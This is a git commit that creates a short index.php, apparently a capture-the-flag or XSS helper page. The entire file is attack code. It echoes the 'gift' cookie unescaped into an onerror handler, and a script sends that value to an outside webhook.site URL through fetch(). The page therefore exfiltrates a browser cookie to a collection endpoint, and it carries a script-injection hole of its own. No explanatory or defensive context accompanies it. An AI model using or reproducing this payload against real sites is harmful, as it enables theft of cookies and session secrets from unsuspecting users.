3ad7a998a0587fd22c23fd4fce24794a324ec680
William957-web <85293841+William957-web@users.noreply.github.com>
2023-12-30 20:24:06 +0800

    Create index.php

---
+++ index.php
@@ -0,0 +1,6 @@
+<img src='x' onerror="print(<?php echo $_COOKIE["gift"] ?>)">
+<script>
+        function print(num){
+            fetch('https://webhook.site/df59d79f-07f6-49e3-899c-e8aa36a4bebe?'+num);
+        }
+	</script>
